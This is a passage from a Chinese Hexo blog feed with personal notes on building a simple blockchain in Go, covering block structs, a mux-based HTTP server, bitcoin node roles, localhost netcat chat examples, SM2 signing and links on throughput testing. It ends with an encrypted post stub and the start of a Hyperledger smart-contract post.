chainhash.Hash<br><br><span class="hljs-comment">// workSum is the total amount of work in the chain up to and including</span><br><span class="hljs-comment">// this node.</span><br>workSum *big.Int<br><br><span class="hljs-comment">// height is parentsMaxHeight + 1</span><br>height <span class="hljs-keyword">int32</span><br><br><span class="hljs-comment">// Some fields from block headers to</span><br><span class="hljs-comment">// reconstruct headers from memory.  These must be treated as</span><br><span class="hljs-comment">// immutable and are intentionally ordered to avoid padding on 64-bit</span><br><span class="hljs-comment">// platforms.</span><br>version    <span class="hljs-keyword">int32</span><br>bits       <span class="hljs-keyword">uint32</span><br>nonce      <span class="hljs-keyword">uint32</span><br>timestamp  <span class="hljs-keyword">int64</span><br>merkleRoot chainhash.Hash<br><br>&#125;<br><br><span class="hljs-keyword">type</span> parentInfo <span class="hljs-keyword">struct</span> &#123;<br>hash chainhash.Hash<br>data [<span class="hljs-number">32</span>]<span class="hljs-keyword">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><p>block 的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Block <span class="hljs-keyword">struct</span> &#123;<br>    Index     <span class="hljs-keyword">int</span><br>    Timestamp <span class="hljs-keyword">string</span><br>    BPM       <span class="hljs-keyword">int</span><br>    Hash      <span class="hljs-keyword">string</span><br>    PrevHash  <span class="hljs-keyword">string</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>Index 是这个块在整个链中的位置</li><li>Timestamp 显而易见就是块生成时的时间戳</li><li>Hash 是这个块通过 SHA256 算法生成的散列值</li><li>PrevHash 代表前一个块的 SHA256 散列值</li><li>BPM 每分钟心跳数，也就是心率。–不太清楚干什么用的</li></ul><p>接着，我们再定义一个结构表示整个链，最简单的表示形式就是一个 Block 的数组：<br><code>var ``Blockchain`` []``Block</code><br>可以看出来，在 go 里面，是<strong>先写变量名，再写类型（比如*，[]），然后是最终类型。</strong></p><h1 id="通信系统"><a href="#通信系统" class="headerlink" title="通信系统"></a>通信系统</h1><h2 id="比特币网络"><a href="#比特币网络" class="headerlink" title="比特币网络"></a>比特币网络</h2><p>首先，比特币网络中的节点主要有四大功能：<strong>钱包、挖矿、区块链数据库、网络路由</strong>。每个节点都会具备路由功能，但其他功能不一定都具备，不同类型的节点可能只包含部分功能，一般只有<strong>比特币核心(bitcoin core)**节点才会包含所有四大功能。<br>所有节点都会参与校验和广播交易及区块信息，且会发现和维持与其他节点的连接。有些节点会包含完整的区块链数据库，包括所有交易数据，这种节点也称为</strong>全节点(Full Node)<strong>。另外一些节点只存储了区块链数据库的一部分，一般只存储区块头而不存储交易数据，它们会通过“</strong>简化交易验证(SPV)<strong>”的方式完成交易校验，这样的节点也称为  **SPV 节点</strong>或<strong>轻节点(Lightweight Node)**。钱包一般是 PC 或手机客户端的功能，用户通过钱包查看自己的账户金额、管理钱包地址和私钥、发起交易等。除了比特币核心钱包是全节点之外，大部分钱包都是</strong>轻节点<strong>。挖矿节点则通过解决</strong>工作量证明(PoW)<strong>算法问题，与其他挖矿节点相互竞争创建新区块。有些挖矿节点同时也是</strong>全节点<strong>，即也存储了完整的区块链数据库，这种节点一般都是</strong>独立矿工(Solo Miner)**。<br>我们知道，矿工创建新区块后，是需要广播给全网所有节点的，当全网都接受了该区块，给矿工的挖矿奖励才算是有效的，这之后才好开始下一个区块 Hash 的计算。所以矿工必须最大限度缩短新区块的广播和下一个区块 Hash 计算之间的时间。</p><h2 id="初试牛刀"><a href="#初试牛刀" class="headerlink" title="初试牛刀"></a>初试牛刀</h2><p>我猜你一定对传统的 web 服务及开发非常熟悉，所以这部分你肯定一看就会。 借助 Gorilla/mux 包，我们先写一个函数来初始化我们的 web 服务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> <span class="hljs-title">error</span></span> &#123;<br>    mux := makeMuxRouter()<br>    httpAddr := os.Getenv(<span class="hljs-string">&quot;ADDR&quot;</span>)<br>    log.Println(<span class="hljs-string">&quot;Listening on &quot;</span>, os.Getenv(<span class="hljs-string">&quot;ADDR&quot;</span>))<br>    s := &amp;http.Server&#123;<br>        Addr:           <span class="hljs-string">&quot;:&quot;</span> + httpAddr,<br>        Handler:        mux,<br>        ReadTimeout:    <span class="hljs-number">10</span> * time.Second,<br>        WriteTimeout:   <span class="hljs-number">10</span> * time.Second,<br>        MaxHeaderBytes: <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>,<br>    &#125;<br>    <span class="hljs-keyword">if</span> err := s.ListenAndServe(); err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">return</span> err<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中的端口号是通过前面提到的 .env 来获得，再添加一些基本的配置参数，这个 web 服务就已经可以 listen and serve 了！ 接下来我们再来定义不同 endpoint 以及对应的 handler。例如，对“/”的 GET 请求我们可以查看整个链，“/”的 POST 请求可以创建块。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makeMuxRouter</span><span class="hljs-params">()</span> <span class="hljs-title">http</span>.<span class="hljs-title">Handler</span></span> &#123;<br>    muxRouter := mux.NewRouter()<br>    muxRouter.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, handleGetBlockchain).Methods(<span class="hljs-string">&quot;GET&quot;</span>)<br>    muxRouter.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, handleWriteBlock).Methods(<span class="hljs-string">&quot;POST&quot;</span>)<br>    <span class="hljs-keyword">return</span> muxRouter<br>&#125;<br></code></pre></td></tr></table></figure><p>GET 请求的 handler：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handleGetBlockchain</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>    bytes, err := json.MarshalIndent(Blockchain, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;  &quot;</span>)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        http.Error(w, err.Error(), http.StatusInternalServerError)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    io.WriteString(w, <span class="hljs-keyword">string</span>(bytes))<br>&#125;<br></code></pre></td></tr></table></figure><p>为了简化，我们直接以 JSON 格式返回整个链，你可以在浏览器中访问 localhost:8080 或者 127.0.0.1:8080 来查看（这里的 8080 就是你在 .env 中定义的端口号 ADDR）。<br>POST 请求的 handler 稍微有些复杂，我们先来定义一下 POST 请求的 payload：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Message <span class="hljs-keyword">struct</span> &#123;<br>    BPM <span class="hljs-keyword">int</span><br>&#125;<br></code></pre></td></tr></table></figure><p>再看看 handler 的实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handleWriteBlock</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>    <span class="hljs-keyword">var</span> m Message<br>    decoder := json.NewDecoder(r.Body)<br>    <span class="hljs-keyword">if</span> err := decoder.Decode(&amp;m); err != <span class="hljs-literal">nil</span> &#123;<br>        respondWithJSON(w, r, http.StatusBadRequest, r.Body)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">defer</span> r.Body.Close()<br>    newBlock, err := generateBlock(Blockchain[<span class="hljs-built_in">len</span>(Blockchain)<span class="hljs-number">-1</span>], m.BPM)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        respondWithJSON(w, r, http.StatusInternalServerError, m)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> isBlockValid(newBlock, Blockchain[<span class="hljs-built_in">len</span>(Blockchain)<span class="hljs-number">-1</span>]) &#123;<br>        newBlockchain := <span class="hljs-built_in">append</span>(Blockchain, newBlock)<br>        replaceChain(newBlockchain)<br>        spew.Dump(Blockchain)<br>    &#125;<br>    respondWithJSON(w, r, http.StatusCreated, newBlock)<br>&#125;<br></code></pre></td></tr></table></figure><p>我们的 POST 请求体中可以使用上面定义的 payload，比如：<br><code>&#123;``&quot;BPM&quot;``:``75``&#125;</code><br>还记得前面我们写的 generateBlock 这个函数吗？它接受一个“前一个块”参数，和一个 BPM 值。POST handler 接受请求后就能获得请求体中的 BPM 值，接着借助生成块的函数以及校验块的函数就能生成一个新的块了！<br>除此之外，你也可以：</p><ul><li>使用 spew.Dump 这个函数可以以非常美观和方便阅读的方式将 struct、slice 等数据打印在控制台里，方便我们调试。</li><li>测试 POST 请求时，可以使用 POSTMAN 这个 chrome 插件，相比 curl 它更直观和方便。</li></ul><p>POST 请求处理完之后，无论创建块成功与否，我们需要返回客户端一个响应：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">respondWithJSON</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request, code <span class="hljs-keyword">int</span>, payload <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>    response, err := json.MarshalIndent(payload, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;  &quot;</span>)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        w.WriteHeader(http.StatusInternalServerError)<br>        w.Write([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;HTTP 500: Internal Server Error&quot;</span>))<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    w.WriteHeader(code)<br>    w.Write(response)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="快要大功告成了"><a href="#快要大功告成了" class="headerlink" title="快要大功告成了"></a>快要大功告成了</h3><p>接下来，我们把这些关于区块链的函数，web 服务的函数“组装”起来：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    err := godotenv.Load()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        log.Fatal(err)<br>    &#125;<br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        t := time.Now()<br>        genesisBlock := Block&#123;<span class="hljs-number">0</span>, t.String(), <span class="hljs-number">0</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>&#125;<br>        spew.Dump(genesisBlock)<br>        Blockchain = <span class="hljs-built_in">append</span>(Blockchain, genesisBlock)<br>    &#125;()<br>    log.Fatal(run())<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>genesisBlock</code> （创世块）是 main 函数中最重要的部分，通过它来初始化区块链，毕竟第一个块的 PrevHash 是空的。</p><h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><p><a href="https://github.com/omnigeeker/golang_blockchain_demo/tree/master/networking">https://github.com/omnigeeker/golang_blockchain_demo/tree/master/networking</a><br>在参考这个步骤的时候，发现始终无法监听到 8000 端口的信息，晚上苦苦思索一个小时没有任何解决思路，今天早上又看了一下，发现我没有改文件？？？？我还是用第一个 demo 文件来模拟多节点，笑死。<br>赶紧创建文件，复制粘贴。<br>bingo！<br><img src="https://image.hackerjerry.top/DAG%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E4%BC%A0%E7%BB%9F%E5%8C%BA%E5%9D%97%E9%93%BE%E6%90%AD%E5%BB%BA%E5%BC%82%E5%90%8C-1.png#height=203&id=sjAuI&margin=%5Bobject%20Object%5D&name=image.png&originHeight=405&originWidth=1361&originalType=binary&size=1018627&status=done&style=none&width=680.5" alt="image.png"><br>这里设置的每 30 秒广播一次区块信息，所以如果一直监听可能会遇到这样的情况：<br><img src="https://image.hackerjerry.top/DAG%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E4%BC%A0%E7%BB%9F%E5%8C%BA%E5%9D%97%E9%93%BE%E6%90%AD%E5%BB%BA%E5%BC%82%E5%90%8C-2.png#height=388&id=W1t1G&margin=%5Bobject%20Object%5D&name=image.png&originHeight=776&originWidth=1345&originalType=binary&size=1812987&status=done&style=none&width=672.5" alt="image.png"><br>注意：这里的 nc 命令和文章中提到的不一样，文章中简单的<code>nc localhost 8000</code>当然可以用，但是这样更规范，它相当于模拟了一个客户端，开放 5000 端口和主机地址的 8000 端口进行通信。<br>用它，甚至可以模拟一个简易的聊天室！<br>nc 的本质是在两台机器之间建立连接，之后就可以基于这个连接做很多事情，数据传输是其中一个最为基本的。我们下面就使用 nc 来建立一个 C/S 的聊天室。<br>模拟 Server 端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> -v ：输出详细信息</span><br><span class="hljs-meta">#</span><span class="bash"> -l ：指定监听地址和端口</span><br>nc -v -l 127.0.0.1 6000<br></code></pre></td></tr></table></figure><p>模拟 Client 端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> -p : 指定源端口</span><br>nc -v -p 5000 localhost 6000<br></code></pre></td></tr></table></figure><p>之后，Client 和 Server 端就可以相互聊天了。<br>Client：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> nc -v -p 5000 localhost 6000</span><br>nc: connect to localhost port 6000 (tcp) failed: Connection refused<br>Connection to localhost 6000 port [tcp/x11] succeeded!<br>Hi, server<br>Hi, client<br></code></pre></td></tr></table></figure><p>Server：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> nc -v -l 127.0.0.1 6000</span><br>Listening on [127.0.0.1] (family 0, port 6000)<br>Connection from [127.0.0.1] port 6000 [tcp/x11] accepted (family 2, sport 5000)<br>Hi, server<br>Hi, client<br></code></pre></td></tr></table></figure><p>nc 具体操作可以参考：<br>【1】<a href="https://www.cnblogs.com/bakari/p/10898604.html">https://www.cnblogs.com/bakari/p/10898604.html</a><br>【2】<a href="https://www.huaweicloud.com/articles/7f323edef71be76eb5705275718ecfef.html">https://www.huaweicloud.com/articles/7f323edef71be76eb5705275718ecfef.html</a><br>【3】<a href="https://www.cnblogs.com/zhaijiahui/p/9028402.html">https://www.cnblogs.com/zhaijiahui/p/9028402.html</a><br>【4】<a href="https://phpor.net/blog/post/225">https://phpor.net/blog/post/225</a></p><h2 id="p2p-多节点网络"><a href="#p2p-多节点网络" class="headerlink" title="p2p 多节点网络"></a>p2p 多节点网络</h2><p><a href="https://github.com/corgi-kx/blockchain_golang/blob/master/network/server.go">https://github.com/corgi-kx/blockchain_golang/blob/master/network/server.go</a><br>我认为需要先在单节点完成 dag 架构的 pow 之后再尝试多节点通讯，所以这里暂时搁置。</p><h1 id="DAG"><a href="#DAG" class="headerlink" title="DAG"></a>DAG</h1><h1 id="SPECTRE-共识"><a href="#SPECTRE-共识" class="headerlink" title="SPECTRE 共识"></a>SPECTRE 共识</h1><h1 id="账户系统与交易签名"><a href="#账户系统与交易签名" class="headerlink" title="账户系统与交易签名"></a>账户系统与交易签名</h1><p>前置知识：<br>【1】<a href="https://learnblockchain.cn/books/geth/part3/sign-and-valid.html">签名与校验</a><br>【2】<a href="https://aaron67.cc/2020/10/10/bitcoin-sign-transaction/">比特币交易中的签名</a><br>【3】<a href="https://blog.csdn.net/AAA123524457/article/details/107693278">比特币交易中的签名与验证</a></p><h2 id="国密-SM2"><a href="#国密-SM2" class="headerlink" title="国密 SM2"></a>国密 SM2</h2><p>流程：<a href="https://blog.csdn.net/samsho2/article/details/80770862">https://blog.csdn.net/samsho2/article/details/80770862</a><br>详细原理：<br>【1】<a href="https://learnblockchain.cn/article/1515">SM2 算法与 KDF 密钥导出函数</a><br>【2】<a href="https://learnblockchain.cn/article/1507">SM2 的签名和验证过程</a><br>以上均要写在本子里<br>“github.com/paul-lee-attorney/gm/sm2” 这个库将所有代码都注释了，非常好，可以直接用<br><a href="https://pkg.go.dev/github.com/paul-lee-attorney/gm/sm2">https://pkg.go.dev/github.com/paul-lee-attorney/gm/sm2</a> 这是它的用法<br><img src="https://image.hackerjerry.top/DAG%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E4%BC%A0%E7%BB%9F%E5%8C%BA%E5%9D%97%E9%93%BE%E6%90%AD%E5%BB%BA%E5%BC%82%E5%90%8C-3.png#height=386&id=P6Coj&margin=%5Bobject%20Object%5D&name=image.png&originHeight=771&originWidth=998&originalType=binary&size=54825&status=done&style=none&width=499" alt="image.png"><br>这个函数可以用在本子里，提升逼格。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;crypto/rand&quot;</span><br><span class="hljs-string">&quot;encoding/hex&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br>_ <span class="hljs-string">&quot;time&quot;</span><br><span class="hljs-comment">//&quot;github.com/rongzer/gm/sm2&quot;</span><br><span class="hljs-string">&quot;github.com/paul-lee-attorney/gm/sm2&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-comment">//fmt.Println(time.Now().Format(&quot;2006-01-02 15:04:05&quot;))</span><br><span class="hljs-comment">//fmt.Println(time.Now().Unix())</span><br><span class="hljs-comment">//bf := bbloom.New(float64(1&lt;&lt;12), float64(0.01))</span><br><span class="hljs-comment">//bf.Add([]byte(&quot;butter&quot;))</span><br><span class="hljs-comment">////Json := bf.JSONMarshal()</span><br><span class="hljs-comment">//var set = bf.ShowBitset()</span><br><span class="hljs-comment">////var value  = 0</span><br><span class="hljs-comment">////for _,v := range set&#123;</span><br><span class="hljs-comment">////value += int(v)</span><br><span class="hljs-comment">////&#125;</span><br><span class="hljs-comment">//fmt.Println(len(set))</span><br><span class="hljs-comment">//priv, err := sm2.GenerateKey(rand.Reader) // 生成密钥对</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatal(err)</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//msg := []byte(&quot;Tongji Fintech Research Institute&quot;)</span><br><span class="hljs-comment">//pub := &amp;priv.PublicKey</span><br><span class="hljs-comment">//sign,err := priv.Sign(rand.Reader, msg, nil)  //sm2签名</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatal(err)</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//fmt.Println(*pub)</span><br><span class="hljs-comment">//isok := pub.Verify(msg, sign)    //sm2验签</span><br><span class="hljs-comment">//fmt.Printf(&quot;Verified: %v\n&quot;, isok)</span><br>msg := []<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;test message 123012301230&quot;</span>)<br><span class="hljs-comment">// 创建公私钥</span><br>priKey, _ := sm2.GenerateKey(rand.Reader)<br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 签名</span><br>sign, err := sm2.Sign(priKey,<span class="hljs-literal">nil</span>, msg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;sign:%s\n&quot;</span>, hex.EncodeToString(sign))<br>fmt.Println(<span class="hljs-string">&quot;prikey:\n&quot;</span>,priKey.GetRawBytes())<br><br>fmt.Printf(<span class="hljs-string">&quot;prikey:%s\n&quot;</span>,hex.EncodeToString(priKey.GetRawBytes()))<br>fmt.Printf(<span class="hljs-string">&quot;pubkey:%s\n&quot;</span>,hex.EncodeToString(priKey.PublicKey.GetRawBytes()))<br><br>src := hex.EncodeToString(priKey.GetRawBytes())<br>n, err :=  hex.DecodeString(src)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br>fmt.Println(n)<br><span class="hljs-comment">// 验签</span><br><span class="hljs-keyword">var</span> res <span class="hljs-keyword">bool</span><br>res,err = sm2.Verify(&amp;priKey.PublicKey,<span class="hljs-literal">nil</span>,msg, sign)<br><span class="hljs-comment">//if err != nil&#123;</span><br><span class="hljs-comment">//panic(err)</span><br><span class="hljs-comment">//&#125;</span><br>fmt.Println(res)<br><br><span class="hljs-keyword">return</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://image.hackerjerry.top/DAG%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E4%BC%A0%E7%BB%9F%E5%8C%BA%E5%9D%97%E9%93%BE%E6%90%AD%E5%BB%BA%E5%BC%82%E5%90%8C-4.png#height=97&id=h4IoK&margin=%5Bobject%20Object%5D&name=image.png&originHeight=193&originWidth=1487&originalType=binary&size=42228&status=done&style=none&width=743.5" alt="image.png"></p><h1 id="维护可信交易用到的技术栈"><a href="#维护可信交易用到的技术栈" class="headerlink" title="维护可信交易用到的技术栈"></a>维护可信交易用到的技术栈</h1><p>hashmap–用于快速查找<br>具体原理：<a href="https://zhuanlan.zhihu.com/p/27108356">https://zhuanlan.zhihu.com/p/27108356</a><br>测试性能：<a href="https://github.com/phf/go-hashmap">https://github.com/phf/go-hashmap</a> 那个测试的样式可以嫖一下</p><h1 id="测压-tps"><a href="#测压-tps" class="headerlink" title="测压 tps"></a>测压 tps</h1><p>【1】<a href="https://hyperledger.github.io/caliper/v0.3.2/architecture-ch/">https://hyperledger.github.io/caliper/v0.3.2/architecture-ch/</a><br>【2】<a href="https://blog.csdn.net/qq_44316726/article/details/108112300?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">https://blog.csdn.net/qq_44316726/article/details/108112300?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242</a><br>【3】<a href="https://zhuanlan.zhihu.com/p/133873895">https://zhuanlan.zhihu.com/p/133873895</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Spatio-temporal-blockchain</title>
    <link href="/2021/03/26/Spatio-temporal-blockchain_new/"/>
    <url>/2021/03/26/Spatio-temporal-blockchain_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="cfe31a77fca4d838806c84f95b026fc2026b4b6f58970f229510fda0859a2dd2"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
      <tag>时空区块链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Deep-understanding-of-intelligent-contracts</title>
    <link href="/2021/03/24/Deep-understanding-of-intelligent-contracts_new/"/>
    <url>/2021/03/24/Deep-understanding-of-intelligent-contracts_new/</url>
    
    <content type="html"><![CDATA[<p>参考官方文档进行进一步了解。</p><a id="more"></a><h1 id="智能合约能干什么"><a href="#智能合约能干什么" class="headerlink" title="智能合约能干什么"></a>智能合约能干什么</h1><p>在各业务彼此进行交互之前，必须先定义一套通用的合约，其中包括通用术语、数据、规则、概念定义和流程。将这些合约放在一起，就构成了管理交易各方之间所有交互的<strong>业务模型</strong>。<br><img src="https://image.hackerjerry.top/Deep-understanding-of-intelligent-contracts-1.png#align=left&display=inline&height=273&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=865&size=56096&status=done&style=none&width=668" alt="image.png"><br>_智能合约用可执行的代码定义了不同组织之间的规则。_<strong><em>应用程序调用智能合约来生成被记录到账本上的交易。</em></strong><br>在<a href="https://hyperledger-fabric.readthedocs.io/zh_CN/latest/smartcontract/smartcontract.html#%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6">上图</a>中，我们可以看到组织  <code>ORG1</code>  和  <code>ORG2</code>  是如何通过定义一个  <code>car</code>  智能合约来实现  <code>查询</code>、<code>转移</code>  和  <code>更新</code>  汽车的。来自这些组织的应用程序调用此智能合约执行业务流程中已商定的步骤，例如将特定汽车的所有权从  <code>ORG1</code>  转移到  <code>ORG2</code>。</p><h1 id="智能合约-amp-链码"><a href="#智能合约-amp-链码" class="headerlink" title="智能合约&amp;链码"></a>智能合约&amp;链码</h1><p>通常，智能合约定义的是控制世界状态中业务对象生命周期的<strong>交易逻辑</strong>，随后该交易逻辑被打包进链码，紧接着链码会被部署到区块链网络中。可以将智能合约看成交易的管理者，而链码则管理着如何将智能合约打包以便用于部署。<br><img src="https://image.hackerjerry.top/Deep-understanding-of-intelligent-contracts-2.png#align=left&display=inline&height=256&margin=%5Bobject%20Object%5D&name=image.png&originHeight=280&originWidth=739&size=28395&status=done&style=none&width=675" 